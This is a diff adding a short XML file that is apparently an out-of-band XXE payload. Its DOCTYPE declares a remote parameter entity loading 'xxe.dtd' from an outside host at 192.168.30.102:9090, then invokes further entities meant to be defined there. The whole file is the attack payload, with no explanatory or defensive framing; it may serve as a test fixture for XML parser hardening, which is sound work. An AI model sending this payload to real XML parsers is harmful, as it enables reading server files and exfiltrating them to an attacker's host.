@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % remote SYSTEM "http://192.168.30.102:9090/xxe.dtd">
+%remote;
+%req;
+]>
+<foo>
+<title>&abc;</title>
+</foo>
